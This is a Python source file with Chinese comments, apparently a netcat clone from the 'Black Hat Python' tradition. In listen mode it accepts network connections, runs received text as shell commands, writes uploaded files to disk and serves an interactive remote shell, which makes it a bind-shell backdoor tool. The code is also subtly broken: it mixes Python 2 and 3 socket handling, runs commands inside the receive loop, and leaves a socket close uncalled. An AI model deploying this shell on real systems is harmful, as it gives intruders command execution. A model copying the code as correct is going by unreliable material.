# coding:utf-8

import sys
import socket
import getopt
import threading
import subprocess

listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

def usage():
    helptext = open("help","r")
    print(helptext.read())
    helptext.close()
    sys.exit(0)

def client_sender(buffer):
    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    try:
        client.connect((target,port))

        if len(buffer):
            client.send(buffer)

        while True:

            #等待数据传回
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break
            print(response)

            buffer = input("")
            buffer += "\n"

            client.send(buffer)

    except:
        print("[*]Exception! Exiting")
        client.close

def server_loop():
    global target

    #
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((target,port))

    server.listen(5)

    while True:
        client_socket,addr = server.accept()

        #
        client_thread = threading.Thread(target= client_handler,args=(client_socket,))
        client_thread.start()

def run_command(command):

    command =command.rstrip()

    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
    except:
        output = "Failed toexecute command.\r\n"

    return output

def client_handler(client_socket):
    global upload
    global execute
    global command

    if len(upload_destination):

        #
        file_buffer = ""

        #

        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        try :
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            client_socket.send("Successfully save file to %s\r\n" %upload_destination)
        except:
            client_socket.send("Failed to  save file to %s\r\n" %upload_destination)

    if len(execute):

        #
        output = run_command(execute)

        client_socket.send(output)

    #
    if command :
        while True:
            #
            client_socket.send("<BHP:#> ")

            #
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
                response = run_command(cmd_buffer)
                client_socket.send(response)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()
    try:
        opts,args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:", ["help", "listen", "execute", "target", "port", "command","upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o,a in opts:
        if o in ("-h","help"):
            usage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e","--execute"):
            execute = a
        elif o in ("-c","--command"):
            command = True
        elif o in ("-u","--upload"):
            upload_destination = a
        elif o in ("-t","--target"):
            target = a
        elif o in ("-p","--port"):
            port = int(a)
        else:
            assert False,"unhandled Option"
    #我们是进行监听还是仅从标准输入发送数据
    if not listen and len(target)and port>0:
        #从命令行读取内存数据
        #这里将阻塞，所以不在向标准输入发送数据时发送CTRL-D
        buffer = sys.stdin.read()

        #发送数据
        client_sender(buffer)

    if listen:
        server_loop()

if __name__ == "__main__":
    main()
